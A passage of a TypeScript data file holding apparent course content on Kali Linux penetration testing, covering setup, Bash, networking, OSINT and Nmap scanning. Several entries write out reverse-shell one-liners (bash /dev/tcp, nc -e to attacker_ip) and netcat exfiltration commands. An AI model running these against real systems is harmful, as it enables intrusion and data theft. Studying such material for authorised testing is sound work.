export interface Concept {
  id: string;
  name: string;
  description: string;
  keyPoints: string[];
  tradeoffs?: string[];
  realWorld?: string[];
}

export interface Topic {
  id: number;
  title: string;
  part: number;
  partTitle: string;
  summary: string;
  concepts: Concept[];
}

export type Chapter = Topic;

export const parts = [
  { id: 1, title: 'Foundations' },
  { id: 2, title: 'Reconnaissance & Scanning' },
  { id: 3, title: 'Exploitation & Attack Tools' },
  { id: 4, title: 'Advanced Topics' },
];

export const topics: Topic[] = [
  // Part 1: Foundations
  {
    id: 1,
    title: 'Kali Linux Setup & Environment',
    part: 1,
    partTitle: 'Foundations',
    summary:
      'Setting up Kali Linux across different platforms including virtual machines, bare metal, WSL2, and ARM devices, configuring desktop environments, and managing packages for a persistent penetration testing workstation.',
    concepts: [
      {
        id: '1-1',
        name: 'Installation Methods (Bare Metal, VM, WSL2, ARM/Raspberry Pi)',
        description:
          'The various ways to install and run Kali Linux depending on your hardware, use case, and whether you need full hardware access or a sandboxed environment for security testing.',
        keyPoints: [
          'Bare metal installation gives direct hardware access (essential for wireless card monitor mode, GPU-accelerated cracking) but makes Kali your primary OS — risky for daily use since Kali runs as root-capable by default and is not hardened for general computing',
          'Virtual machine installation (VirtualBox, VMware, QEMU/KVM) is the most common approach — Kali provides pre-built OVA/VMDK images that boot in minutes, and snapshots let you revert to a clean state between engagements',
          'WSL2 (Windows Subsystem for Linux) runs Kali as a lightweight Linux instance inside Windows — ideal for command-line tools and scripting, but lacks raw socket access and USB passthrough needed for wireless attacks and hardware-dependent tools',
          'ARM/Raspberry Pi images turn a $35 device into a portable dropbox — Kali ARM supports RPi, ODROID, and BeagleBone, commonly used as covert network implants during physical penetration tests',
          'Docker containers (kalilinux/kali-rolling) provide ephemeral, reproducible environments for specific tools — useful for CI/CD pipeline security scanning, but lack kernel-level access needed for many exploitation tools',
        ],
        tradeoffs: [
          'VMs provide excellent isolation and snapshot capability but USB passthrough for wireless adapters requires additional configuration and some tools (GPU cracking with hashcat) suffer significant performance penalties in virtualized environments',
          'WSL2 offers seamless Windows integration and low overhead but cannot perform raw packet injection, monitor mode WiFi attacks, or direct USB device access — making it unsuitable for wireless and hardware-based testing',
          'ARM/Raspberry Pi installations are ultra-portable and cheap but have limited CPU/RAM for resource-intensive tasks like password cracking or running heavy scanners — they excel as network implants, not primary workstations',
        ],
        realWorld: [
          'Offensive Security (now OffsecSec) provides official pre-built VMware and VirtualBox images on kali.org — the recommended starting point for OSCP students and most penetration testers',
          'Physical penetration testers deploy Raspberry Pi Zero W running Kali as network dropboxes — the device connects to the target LAN and creates a reverse SSH tunnel back to the attacker, providing persistent remote access',
          'Cloud-based Kali instances on AWS/Azure/GCP are used for external penetration tests — the tester provisions a Kali EC2 instance in a region close to the target for lower latency and uses it as a pivot point',
          'HTB (Hack The Box) and TryHackMe recommend VirtualBox + Kali OVA as the standard setup for their CTF labs and learning paths',
        ],
      },
      {
        id: '1-2',
        name: 'Desktop Environments & Customization (XFCE, GNOME, Headless)',
        description:
          'Configuring the Kali Linux desktop environment for efficient security work, including choosing between lightweight and full-featured desktops, and setting up headless operation for server deployments.',
        keyPoints: [
          'XFCE is the default Kali desktop since 2019 — it is lightweight (~400MB RAM), fast, and customizable while providing all the GUI functionality needed for tools like Burp Suite, Wireshark, and browser-based testing',
          'GNOME and KDE Plasma are available as alternatives (install via kali-desktop-gnome or kali-desktop-kde) — they offer richer features and modern aesthetics at the cost of higher resource consumption (~800MB-1.2GB RAM)',
          'Headless/minimal installations (kali-linux-core metapackage) skip the desktop entirely — used for servers, containers, dropboxes, and SSH-only access where every megabyte of RAM matters',
          'Kali Undercover mode (available in XFCE) transforms the desktop appearance to look like Windows 10 — designed for penetration testers working in public or client-facing environments where a hacking-themed desktop would draw unwanted attention',
          'Terminal configuration matters: tools like tmux or screen allow multiplexing multiple shell sessions, which is critical during engagements where you are running scanners, listeners, and exploits simultaneously across multiple panes',
        ],
        tradeoffs: [
          'XFCE strikes the best balance between resource usage and functionality for most testers, but GNOME provides better HiDPI/4K display support and a more polished experience on modern hardware',
          'Headless installations minimize attack surface and resource usage but require all work to be done via SSH/CLI — some tools (Burp Suite, Wireshark GUI, browser-based exploitation) require a desktop or X11 forwarding',
          'Heavy customization makes your environment efficient but creates a non-reproducible setup — document your customizations or use configuration management (Ansible, dotfiles repos) so you can rebuild quickly',
        ],
        realWorld: [
          'OSCP exam environments typically use Kali with the default XFCE desktop — students are advised to practice in the same environment they will use during the 24-hour exam',
          'Red teams deploying Kali on cloud VPS instances use headless mode with tmux — SSH in, start a tmux session, and detach/reattach as needed throughout multi-day engagements',
          'Kali Undercover mode was demonstrated at DEF CON and is used by consultants performing assessments from client offices or coffee shops where visible hacking tools could cause concern',
        ],
      },
      {
        id: '1-3',
        name: 'Package Management & Persistence (apt, kali-tweaks, Live USB)',
        description:
          'Managing the vast Kali Linux tool repository using apt and metapackages, configuring kali-tweaks for a tailored environment, and setting up persistent storage on live USB installations.',
        keyPoints: [
          'Kali uses Debian apt package management — "sudo apt update && sudo apt full-upgrade" keeps the rolling release current; kali-rolling tracks Debian Testing with Kali-specific patches and tool updates',
          'Metapackages bundle tools by category: kali-linux-default (standard tools), kali-tools-web (web testing), kali-tools-wireless (WiFi attacks), kali-tools-passwords (cracking), kali-tools-exploitation (Metasploit, etc.) — install only what you need to reduce disk usage and attack surface',
          'kali-tweaks is an interactive configuration tool for enabling/disabling repositories (kali-experimental, kali-bleeding-edge), configuring shells (bash/zsh with custom prompts), setting up virtualization guest tools, and managing network configuration',
          'Live USB with persistence uses a separate encrypted partition (luks) to store tool configurations, wordlists, engagement data, and custom scripts across reboots — "dd if=kali.iso of=/dev/sdb bs=4M" for the base, then create a persistence partition with cryptsetup',
          'Kaboxer (Kali Application Boxer) packages tools as Docker containers — used for tools with complex dependency chains (Covenant, Maltego) that would conflict with system packages if installed natively',
        ],
        tradeoffs: [
          'Installing all tools via kali-linux-everything (~15GB) ensures nothing is missing but wastes disk space, increases update time, and expands the attack surface of your own machine — targeted metapackage installation is preferred',
          'The kali-rolling repository provides the latest tools but can occasionally break — for critical engagements, snapshot your VM before upgrading or use kali-last-snapshot for a more stable base',
          'Encrypted persistence on live USB protects engagement data if the drive is lost but adds boot time and a passphrase entry step — for sensitive engagements, always enable LUKS encryption on the persistence partition',
        ],
        realWorld: [
          'Penetration testers typically maintain a base Kali VM image with kali-linux-default plus their preferred additional tools, then clone it for each engagement to maintain a clean, reproducible starting point',
          'OffSec maintains a list of every tool in Kali at tools.kali.org — each entry includes the tool name, description, installed size, homepage, and the metapackage it belongs to',
          'Bug bounty hunters often use minimal Kali installs with only web-focused tools (Burp Suite, ffuf, nuclei, httpx) to keep the environment lean and focused on their target scope',
          'Kali live USB with encrypted persistence is the standard approach for on-site penetration tests — the tester boots from USB, all engagement artifacts are stored on the encrypted partition, and the USB can be wiped after the report is delivered',
        ],
      },
    ],
  },
  {
    id: 2,
    title: 'Command-Line Essentials for Security',
    part: 1,
    partTitle: 'Foundations',
    summary:
      'Mastering the Bash command line for security work — navigating file systems, processing and extracting data from tool output, and automating repetitive tasks with shell scripts and one-liners.',
    concepts: [
      {
        id: '2-1',
        name: 'Bash Fundamentals & File System Navigation',
        description:
          'Core Bash skills for navigating the Linux file system, managing files, understanding permissions, and working efficiently in the terminal — the foundation for every security tool and technique in Kali.',
        keyPoints: [
          'Essential navigation: pwd, ls -la, cd, find, locate (updatedb), which, whereis — knowing where tools are installed and how to find files quickly is critical when exploring compromised systems',
          'File permissions and ownership (chmod, chown, ls -la) — understanding the rwx/octal permission model is fundamental to both privilege escalation (finding SUID binaries) and securing your own tools',
          'Process management: ps aux, top/htop, kill, jobs, bg, fg, nohup — managing long-running scans and tools that must persist after terminal disconnect',
          'I/O redirection and piping: stdout (>), stderr (2>), both (&>), append (>>), pipe (|) — chaining tools together is the Unix philosophy that makes Kali powerful, e.g., "nmap -oG - | grep open | cut -d/ -f1"',
          'Environment variables and PATH: export, .bashrc/.zshrc, adding custom tool directories to PATH — understanding how the shell resolves commands is essential for both your workflow and understanding attackers who modify PATH for persistence',
        ],
        tradeoffs: [
          'Bash/Zsh proficiency takes significant practice but is non-negotiable for penetration testing — GUI-only testers are severely limited in speed, automation, and the ability to chain tools creatively',
          'Zsh (Kali default since 2020) offers better tab completion and plugins (oh-my-zsh) but some older scripts and tutorials assume Bash — use "#!/bin/bash" explicitly in scripts for portability',
          'find is powerful but slow on large file systems — locate (backed by a database) is faster for known filenames but requires updatedb to be current, which may not be the case on a compromised target',
        ],
        realWorld: [
          'During OSCP, candidates must be fluent in Bash to chain tools efficiently within the 24-hour time limit — GUI-dependent testers consistently run out of time',
          'Post-exploitation enumeration relies heavily on file system navigation: "find / -perm -4000 -type f 2>/dev/null" finds all SUID binaries, a common privilege escalation vector',
          'CTF challenges frequently require piping and redirection: extracting flags from binary output, decoding base64 streams, and processing large data files with command-line tools',
          'Red team operators use SSH with tmux, managing 10+ shell sessions simultaneously across multiple compromised hosts — Bash fluency is essential for this workflow',
        ],
      },
      {
        id: '2-2',
        name: 'Text Processing & Data Extraction (grep, awk, sed, cut, sort, uniq)',
        description:
          'Using Unix text processing tools to extract, filter, transform, and analyze data from security tool output, log files, and captured network data.',
        keyPoints: [
          'grep: pattern matching with regex — "grep -rn password /etc/" searches recursively with line numbers; "grep -oP \'\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\'" extracts IP addresses from any text; -i for case-insensitive, -v for inverse match',
          'awk: column-based data extraction — "awk \'{print $1}\'" extracts the first field; "awk -F: \'{print $1,$3}\' /etc/passwd" extracts usernames and UIDs; awk can perform calculations, conditionals, and formatting on structured data',
          'sed: stream editing for find-and-replace — "sed \'s/old/new/g\'" for global substitution; "sed -n \'10,20p\'" prints lines 10-20; used to clean and transform tool output before further processing',
          'cut, sort, uniq pipeline: "cut -d: -f1 /etc/passwd | sort | uniq -c | sort -rn" — this pattern (extract field, sort, count unique, rank) is used constantly to summarize scan results, log entries, and extracted credentials',
          'Real-world chaining: "cat access.log | awk \'{print $1}\' | sort | uniq -c | sort -rn | head -20" shows the top 20 IP addresses by request count — essential for log analysis during incident response and web app testing',
        ],
        tradeoffs: [
          'grep + awk + sed can accomplish almost any text processing task but complex pipelines become unreadable — for anything beyond a few pipes, consider writing a Python script for maintainability',
          'Regular expressions are extremely powerful but subtle errors lead to missed matches or false positives — always test regex patterns on sample data before running them against production logs or scan results',
          'These tools process text line-by-line and are not suitable for structured data formats (JSON, XML) without additional tools — use jq for JSON and xmllint/xmlstarlet for XML parsing',
        ],
        realWorld: [
          'Extracting live hosts from Nmap grepable output: "grep \"Status: Up\" nmap_sweep.gnmap | awk \'{print $2}\'" — produces a clean list of IP addresses for the next phase of scanning',
          'Password spray result analysis: "grep -i \"success\\|valid\" spray_output.txt | awk \'{print $2,$4}\'" — quickly identifies which credentials worked from thousands of attempts',
          'Log analysis during a web app assessment: "cat proxy.log | grep -E \"(200|301|302)\" | awk \'{print $7}\' | sort -u" — extracts unique URLs that returned successful responses',
          'CTF challenges regularly require text processing: "strings binary_file | grep -i flag" or "xxd firmware.bin | grep -i \"pass\"" to find embedded secrets',
        ],
      },
      {
        id: '2-3',
        name: 'Shell Scripting & Task Automation (Loops, Conditionals, Cron)',
        description:
          'Writing Bash scripts and one-liners to automate repetitive security tasks — from scanning entire subnets to monitoring for changes and scheduling recurring reconnaissance.',
        keyPoints: [
          'For loops for target iteration: "for ip in $(cat targets.txt); do nmap -sV -p 80,443 $ip >> results.txt; done" — automates scanning a list of targets; use "while read" for safer line-by-line processing of files with spaces or special characters',
          'Conditionals for decision-making: "if nmap -p 80 --open $ip | grep -q open; then echo \"$ip has web\" >> web_hosts.txt; fi" — use exit codes ($?) and test conditions to build intelligent automation',
          'Functions for reusable logic: "function scan_host() { nmap -sCV -oA output/$1 $1; searchsploit --nmap output/$1.xml; }" — encapsulate multi-step procedures into callable functions for consistency across an engagement',
          'Cron for scheduled tasks: "0 */6 * * * /opt/scripts/recon_monitor.sh" — schedule recurring reconnaissance (subdomain enumeration, port monitoring, certificate transparency log checks) to detect changes in a target environment over time',
          'One-liner power: "for port in $(seq 1 65535); do (echo >/dev/tcp/$ip/$port) 2>/dev/null && echo \"$port open\"; done" — a pure Bash port scanner requiring no external tools, useful on minimal compromised systems with no nmap available',
        ],
        tradeoffs: [
          'Bash scripts are fast to write and universally available on Linux targets but lack error handling, type safety, and library support — for complex automation (API interactions, database queries, report generation), Python is a better choice',
          'Automating attacks increases speed and coverage but also increases noise — automated scans are more likely to trigger IDS/IPS alerts than careful manual testing; balance speed against stealth based on engagement rules',
          'Cron jobs provide persistence and scheduling but leave artifacts (crontab entries, log entries in /var/log/syslog) — on a compromised system, attackers use cron for persistence, and defenders check crontab for indicators of compromise',
        ],
        realWorld: [
          'Bug bounty hunters maintain custom recon automation scripts (like Nahamsec\'s lazyrecon or Jason Haddix\'s methodology) that chain subfinder, httpx, nuclei, and other tools into end-to-end reconnaissance pipelines',
          'OSCP students write Bash scripts to automate initial enumeration: port scan, service detection, screenshot, and searchsploit lookup — saving critical time during the 24-hour exam',
          'Red team operators use Bash one-liners for living-off-the-land (LOL) techniques on compromised Linux hosts: "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" is the classic Bash reverse shell one-liner',
          'Continuous reconnaissance platforms (ProjectDiscovery\'s Notify, custom cron scripts) alert bug bounty hunters when new subdomains, open ports, or services appear on target organizations — enabling rapid response to new attack surface',
        ],
      },
    ],
  },
  {
    id: 3,
    title: 'Networking Fundamentals in Kali',
    part: 1,
    partTitle: 'Foundations',
    summary:
      'Essential networking tools and techniques in Kali Linux — configuring interfaces, using Netcat for versatile network communication, and leveraging proxychains, Tor, and SSH tunnels for anonymity and pivoting.',
    concepts: [
      {
        id: '3-1',
        name: 'Network Configuration & Troubleshooting (ip, ifconfig, route, netstat/ss)',
        description:
          'Configuring network interfaces, inspecting routing tables, and diagnosing connectivity issues using core Linux networking commands — foundational knowledge for every network-based attack and defense.',
        keyPoints: [
          'ip command (iproute2 suite) is the modern replacement for ifconfig/route/arp: "ip addr show" lists interfaces and IPs, "ip route show" displays the routing table, "ip link set eth0 up/down" manages interface state — learn ip, not the deprecated ifconfig',
          'Interface management for testing: "ip addr add 192.168.1.100/24 dev eth0" adds an IP, "ip addr flush dev eth0" clears all IPs — testers frequently need to reconfigure interfaces for different network segments during an engagement',
          'ss (socket statistics) replaces netstat: "ss -tulnp" shows all listening TCP/UDP ports with process names — essential for verifying your listeners are running and for enumerating services on compromised hosts',
          'DNS troubleshooting: dig, nslookup, host — "dig @8.8.8.8 target.com ANY" queries all DNS record types; "dig -x 10.10.10.5" performs reverse DNS lookup; DNS enumeration is the first step in most reconnaissance workflows',
          'Wireless interface management: "iwconfig" shows wireless interface status, "airmon-ng start wlan0" puts the adapter into monitor mode — monitor mode is required for wireless packet capture and injection attacks',
        ],
        tradeoffs: [
          'The ip command is more powerful and consistent than ifconfig/route but has a steeper learning curve and more verbose syntax — muscle memory from ifconfig-era tutorials needs to be updated',
          'Manually configuring network interfaces gives full control but changes are lost on reboot unless persisted in /etc/network/interfaces or NetworkManager — for persistent changes in Kali, edit configuration files or use nmcli',
          'Enabling monitor mode on a wireless adapter takes the interface offline for normal networking — you cannot use the same adapter for WiFi attacks and internet access simultaneously without a second adapter',
        ],
        realWorld: [
          'During internal penetration tests, testers connect to the client network and use "ip addr" and "ip route" to understand their network position, then add routes to reach additional subnets discovered during enumeration',
          'Post-exploitation on a Linux host: "ss -tulnp" reveals all listening services (potential pivot points), and "ip route" shows connected networks (potential lateral movement targets)',
          'Wireless penetration testing setup: plug in an Alfa AWUS036ACH adapter, verify detection with "iwconfig", enable monitor mode with "airmon-ng start wlan0", verify with "iwconfig wlan0mon" — this sequence is the beginning of every WiFi assessment',
          'CTF networking challenges often require adding routes or configuring interfaces to reach challenge networks: "ip route add 10.10.10.0/24 via 10.10.14.1 dev tun0" is common on HTB/THM VPN setups',
        ],
      },
      {
        id: '3-2',
        name: 'Netcat Swiss Army Knife (Listeners, Reverse Shells, File Transfer)',
        description:
          'Netcat (nc/ncat) is the most versatile networking utility in the penetration tester\'s toolkit — used for port scanning, banner grabbing, file transfer, and establishing reverse/bind shells during exploitation.',
        keyPoints: [
          'Listener setup: "nc -lvnp 4444" starts a listening TCP server on port 4444 — the -l (listen), -v (verbose), -n (no DNS), -p (port) flags are used in nearly every reverse shell scenario; ncat (from Nmap) adds SSL support with --ssl',
          'Reverse shell: target runs "nc -e /bin/bash attacker_ip 4444" (or "bash -i >& /dev/tcp/attacker_ip/4444 0>&1" when nc lacks -e) and the attacker catches the connection on their listener — reverse shells bypass firewalls that block inbound connections',
          'Bind shell: target runs "nc -lvnp 4444 -e /bin/bash" and the attacker connects to target:4444 — simpler but requires the target port to be accessible through firewalls, making it less commonly used than reverse shells',
          'File transfer: sender runs "nc -lvnp 9999 < secret_file" and receiver runs "nc sender_ip 9999 > received_file" — useful for exfiltrating data from compromised hosts without installing additional tools',
          'Port scanning: "nc -zv target 1-1000 2>&1 | grep succeeded" performs a quick connect scan — not as feature-rich as Nmap but available on minimal systems where Nmap is not installed',
        ],
        tradeoffs: [
          'Traditional netcat (nc) often lacks the -e flag on modern systems for security reasons — alternatives include ncat (--exec), socat (more powerful but complex syntax), and Bash built-in /dev/tcp redirections',
          'Netcat transfers are unencrypted by default — ncat with --ssl or socat with SSL provides encrypted communication; on sensitive engagements, always encrypt your C2 traffic to avoid detection and protect client data',
          'Netcat shells are unstable (no job control, no tab completion, Ctrl+C kills the shell) — upgrade with "python3 -c \'import pty;pty.spawn(\"/bin/bash\")\'" then Ctrl+Z, "stty raw -echo; fg" for a fully interactive TTY',
        ],
        realWorld: [
          'The classic OSCP methodology: find a vulnerability, trigger a reverse shell payload that calls back to a netcat listener on the attacker machine, upgrade to a stable TTY, then proceed with privilege escalation',
          'Socat as a Netcat upgrade: "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane" creates a fully interactive reverse shell with PTY — far more stable than basic netcat',
          'CTF file exfiltration: on a compromised box without curl/wget, "cat /root/flag.txt | nc attacker_ip 9999" sends the flag to a listener on the attacker machine',
          'Penetration testers use netcat relay chains (nc to nc) to pivot through multiple compromised hosts when more sophisticated tools are not available',
        ],
      },
      {
        id: '3-3',
        name: 'Proxychains, Tor & SSH Tunneling (Anonymity, Pivoting, SOCKS)',
        description:
          'Techniques for anonymizing traffic, bypassing network restrictions, and pivoting through compromised hosts using proxychains, Tor, SSH tunnels, and SOCKS proxies — essential for both operational security and reaching internal networks.',
        keyPoints: [
          'Proxychains routes any TCP application through a proxy chain (SOCKS4/5, HTTP): "proxychains nmap -sT -Pn target" runs Nmap through Tor or a SOCKS proxy — configured in /etc/proxychains4.conf with proxy list and chain type (strict, dynamic, random)',
          'Tor integration: start the Tor service ("sudo systemctl start tor"), configure proxychains to use 127.0.0.1:9050 (SOCKS5), and all proxychained traffic routes through the Tor network — provides anonymity for reconnaissance but significantly reduces speed',
          'SSH local port forwarding: "ssh -L 8080:internal_host:80 user@pivot_host" — maps local port 8080 to an internal host through a compromised SSH server, allowing your tools to reach systems behind the firewall',
          'SSH dynamic port forwarding (SOCKS proxy): "ssh -D 9050 user@pivot_host" creates a SOCKS5 proxy on local port 9050 — combined with proxychains, this lets you route any tool through the pivot host to reach the entire internal network',
          'SSH remote port forwarding: "ssh -R 8443:localhost:443 user@attacker_vps" — exposes a local service through a remote server, useful when the compromised host can reach the internet but the attacker cannot reach the compromised host directly',
        ],
        tradeoffs: [
          'Proxychains only works with TCP connections and does not support UDP or ICMP — Nmap must use -sT (TCP connect) instead of -sS (SYN scan), and DNS resolution must be handled by proxychains (proxy_dns setting) to prevent DNS leaks',
          'Tor provides strong anonymity but introduces high latency (300-1000ms+) and is actively blocked by many targets — some organizations flag Tor exit node IPs and will immediately investigate traffic from them',
          'SSH tunnels are simple and encrypted but require valid SSH credentials on the pivot host — if SSH is not available, tools like Chisel (Go-based TCP/UDP tunneling) or Ligolo-ng provide similar functionality over HTTP/HTTPS',
        ],
        realWorld: [
          'Red team pivoting: compromise a DMZ web server, create an SSH SOCKS proxy ("ssh -D 1080 user@dmz_host"), configure proxychains, and scan the entire internal 10.0.0.0/8 network through the pivot — a standard technique in every internal penetration test',
          'Bug bounty reconnaissance through Tor: "proxychains subfinder -d target.com" and "proxychains httpx -l subdomains.txt" hide the hunter\'s IP during passive and active reconnaissance phases',
          'Chisel tunneling: attacker runs "chisel server --reverse --port 8080" and the compromised host runs "chisel client attacker_ip:8080 R:socks" — creates a reverse SOCKS proxy without needing SSH, often used when SSH is locked down',
          'OSCP pivoting scenario: students must chain multiple SSH tunnels or use tools like sshuttle ("sshuttle -r user@pivot 10.10.10.0/24") to route traffic through a compromised host and reach a second network segment containing the final target',
        ],
      },
    ],
  },

  // Part 2: Reconnaissance & Scanning
  {
    id: 4,
    title: 'Information Gathering & OSINT Tools',
    part: 2,
    partTitle: 'Reconnaissance & Scanning',
    summary:
      'Using Kali Linux tools for passive and active information gathering — from WHOIS lookups and DNS enumeration to automated OSINT frameworks — building a comprehensive target profile before active exploitation.',
    concepts: [
      {
        id: '4-1',
        name: 'Passive Reconnaissance (theHarvester, WHOIS, DNS Enumeration)',
        description:
          'Gathering intelligence about a target without directly interacting with their systems — using public data sources, DNS records, search engines, and certificate transparency logs to map the attack surface.',
        keyPoints: [
          'theHarvester: "theHarvester -d target.com -b google,bing,linkedin,crtsh" — scrapes search engines, PGP key servers, and certificate transparency logs to find emails, subdomains, IPs, and employee names associated with a domain',
          'WHOIS enumeration: "whois target.com" reveals registrant information, name servers, registration dates, and sometimes admin contact details — "whois 203.0.113.50" provides IP block ownership (ASN, CIDR range, organization)',
          'DNS enumeration with dnsrecon: "dnsrecon -d target.com -t std,brt,axfr" performs standard records lookup, brute-force subdomain enumeration, and attempts zone transfers — zone transfers (AXFR) are a misconfiguration that leaks the entire DNS zone file',
          'Fierce: "fierce --domain target.com" performs DNS reconnaissance including zone transfer attempts, wildcard detection, and nearby IP range scanning — useful for finding non-contiguous IP blocks belonging to the target',
          'Certificate Transparency logs: "curl -s \'https://crt.sh/?q=%.target.com&output=json\' | jq -r \'.[].name_value\' | sort -u" — CT logs are a gold mine for discovering subdomains, including internal and staging systems that may be exposed',
        ],
        tradeoffs: [
          'Passive reconnaissance leaves no footprint on the target but is limited to publicly available information — it cannot discover internal hosts, non-indexed services, or systems without DNS records',
          'Automated tools like theHarvester are fast and comprehensive but generate API requests to third-party services that may rate-limit, block, or log your queries — spreading queries across multiple sources and timeframes reduces this risk',
          'DNS brute-forcing can discover hidden subdomains but generates significant DNS query volume — use targeted wordlists (SecLists/Discovery/DNS) rather than exhaustive brute-force to balance coverage against detection risk',
        ],
        realWorld: [
          'Bug bounty programs explicitly allow passive reconnaissance — hunters use theHarvester, Amass, subfinder, and crt.sh to build comprehensive subdomain lists before any active scanning, often discovering forgotten assets in scope',
          'Subdomain takeover vulnerabilities are found through DNS enumeration: a CNAME pointing to an unclaimed cloud resource (S3 bucket, Azure app, Heroku) can be claimed by an attacker — tools like subjack and nuclei detect these automatically',
          'WHOIS data led to the identification of APT groups: researchers correlated domain registrant emails, phone numbers, and registration patterns across malicious infrastructure to attribute campaigns to specific threat actors',
          'OSINT competitions (Trace Labs, SANS OSINT CTF) teach these techniques in a competitive format — participants use passive reconnaissance to locate missing persons using only publicly available information',
        ],
      },
      {
        id: '4-2',
        name: 'Active Reconnaissance (Recon-ng, Maltego, Shodan CLI)',
        description:
          'Using automated reconnaissance frameworks and internet-wide scanning databases to actively enumerate target infrastructure, discover services, and map organizational relationships.',
        keyPoints: [
          'Recon-ng: a modular reconnaissance framework with a Metasploit-like interface — "marketplace install all" loads modules, then "modules load recon/domains-hosts/hackertarget" and "run" to enumerate; results are stored in a local database for querying and reporting',
          'Maltego: a visual link analysis tool that maps relationships between entities (domains, IPs, emails, social profiles, organizations) — transforms query data sources and build interactive graphs showing how target infrastructure is connected',
          'Shodan CLI: "shodan search \'org:\"Target Corp\" port:22,80,443\'" queries the Shodan internet-wide scanning database — reveals exposed services, banners, SSL certificates, and known vulnerabilities without sending a single packet to the target',
          'Censys and FOFA provide similar internet scanning databases — "censys search \'services.software.product:Apache AND services.port:8080 AND autonomous_system.name:\"Target ISP\"\'" finds specific services within target IP ranges',
          'Amass (OWASP): "amass enum -active -d target.com -brute -w wordlist.txt -o output.txt" — combines passive sources, DNS brute-forcing, certificate analysis, and active probing into the most comprehensive subdomain enumeration tool available',
        ],
        tradeoffs: [
          'Active reconnaissance directly interacts with target systems and can be detected — DNS queries, web requests, and service probes leave logs; balance thoroughness against stealth requirements for the engagement',
          'Shodan/Censys provide reconnaissance without touching the target but their data can be hours to weeks old — critical for initial intelligence but must be verified with direct scanning before exploitation',
          'Maltego provides excellent visualization for complex target environments but the Community Edition has limited transforms and data — the commercial license is expensive ($999+/year) but essential for professional OSINT work',
        ],
        realWorld: [
          'Penetration testers use Shodan to discover internet-facing services before an engagement begins: "shodan search \'ssl.cert.subject.cn:target.com\'" finds all servers with certificates issued to the target domain, including cloud services and CDNs',
          'Recon-ng workflows: populate the database with target domains, run host enumeration modules, then pivot to IP resolution, port scanning, and vulnerability lookups — the database stores everything for the engagement report',
          'Maltego is used by law enforcement and intelligence agencies for link analysis — mapping criminal networks, following money trails through cryptocurrency, and visualizing relationships between suspects, infrastructure, and communication channels',
          'Bug bounty hunters automate Amass + httpx + nuclei pipelines: discover subdomains, identify live web servers, and scan for known vulnerabilities in a single automated workflow — this pipeline consistently finds critical vulnerabilities on large scope programs',
        ],
      },
      {
        id: '4-3',
        name: 'Target Profiling & Attack Surface Mapping',
        description:
          'Synthesizing reconnaissance data into a comprehensive target profile — identifying the full attack surface including domains, IP ranges, technologies, employees, and potential entry points for exploitation.',
        keyPoints: [
          'Attack surface mapping combines all reconnaissance outputs: subdomains (Amass/subfinder), live hosts (httpx/httprobe), technology fingerprints (Wappalyzer, whatweb), open ports (Nmap/masscan), and employee data (theHarvester/LinkedIn) into a unified target model',
          'Technology fingerprinting: "whatweb target.com" or "wappalyzer-cli target.com" identifies CMS (WordPress, Drupal), frameworks (React, Angular), servers (Apache, Nginx), and WAFs (Cloudflare, Akamai) — each technology has known vulnerabilities and attack vectors',
          'Web application endpoint discovery: "gospider -s https://target.com -d 2 -c 10" crawls the target site, extracting URLs, JavaScript files, API endpoints, and form actions — combined with "linkfinder -i https://target.com/app.js" to extract API endpoints from JavaScript',
          'Cloud asset discovery: identify S3 buckets ("aws s3 ls s3://target-backup --no-sign-request"), Azure blobs, GCP storage, and cloud-hosted services — misconfured cloud storage is one of the most common high-severity findings in penetration tests',
          'Attack surface prioritization: rank discovered assets by exposure (internet-facing vs internal), age (legacy systems), technology (known vulnerable versions), and business criticality (login pages, APIs, admin panels) to focus exploitation efforts where they are most likely to succeed',
        ],
        tradeoffs: [
          'Comprehensive attack surface mapping takes significant time (hours to days for large organizations) but ensures you do not miss critical assets — rushing to exploitation without thorough reconnaissance is the most common mistake in penetration testing',
          'Automated discovery tools generate large amounts of data that must be triaged — without manual analysis and deduplication, testers drown in false positives and waste time on irrelevant targets',
          'Deep crawling and brute-forcing web applications can cause performance issues or trigger WAF blocks — respect rate limits and coordinate with the client if aggressive scanning is needed',
        ],
        realWorld: [
          'PTES (Penetration Testing Execution Standard) dedicates an entire phase to intelligence gathering and target profiling — professional penetration testers typically spend 30-40% of the engagement on reconnaissance before any exploitation',
          'Aquatone: "cat subdomains.txt | aquatone" takes a list of subdomains, screenshots them all, and generates an HTML report with thumbnails — testers quickly scan hundreds of web applications visually to identify interesting targets',
          'Bug bounty hunter Jason Haddix\'s methodology (presented at Defcon/Bugcrowd LevelUp) emphasizes deep reconnaissance as the key differentiator between successful and unsuccessful hunters — "hackers who recon the hardest find the most bugs"',
          'Real-world breach analysis: the 2019 Capital One breach exploited a misconfigured WAF on an EC2 instance — comprehensive attack surface mapping would have identified the exposed metadata endpoint that enabled the SSRF attack',
        ],
      },
    ],
  },
  {
    id: 5,
    title: 'Nmap & Network Scanning',
    part: 2,
    partTitle: 'Reconnaissance & Scanning',
    summary:
      'Mastering Nmap — the most important single tool in Kali Linux — for host discovery, port scanning, service detection, and vulnerability assessment using the Nmap Scripting Engine.',
    concepts: [
      {
        id: '5-1',
        name: 'Host Discovery & Port Scanning Techniques (SYN, TCP Connect, UDP, Stealth)',
        description:
          'The different Nmap scan types and how they work at the TCP/IP level — understanding when to use each technique based on the target environment, stealth requirements, and engagement rules.',
        keyPoints: [
          'SYN scan (-sS): the default and most popular — sends SYN, receives SYN/ACK (open) or RST (closed), never completes the three-way handshake; "half-open" scanning is fast, stealthy, and requires raw socket privileges (root/sudo)',
          'TCP connect scan (-sT): completes the full TCP three-way handshake — slower and more detectable than SYN scan but works without root privileges and is the only option through SOCKS proxies (proxychains nmap -sT)',
          'UDP scan (-sU): sends UDP packets and waits for ICMP port unreachable (closed) or no response (open|filtered) — notoriously slow because open UDP ports rarely respond; combine with version detection (-sUV) for accuracy',
          'Host discovery: -sn (ping sweep), -Pn (skip host discovery, assume all hosts are up), -PS/-PA/-PU (TCP SYN/ACK/UDP ping) — "nmap -sn 192.168.1.0/24" discovers live hosts before detailed port scanning; use -Pn when ICMP is blocked',
          'Port specification: -p 80,443 (specific ports), -p 1-1000 (range), -p- (all 65535 ports), --top-ports 1000 (most common) — always scan all ports (-p-) on high-value targets to catch services on non-standard ports',
        ],
        tradeoffs: [
          'SYN scans are fast and relatively stealthy but modern IDS/IPS (Snort, Suricata) specifically detect SYN scan patterns — it is not truly invisible, just less noisy than full connect scans',
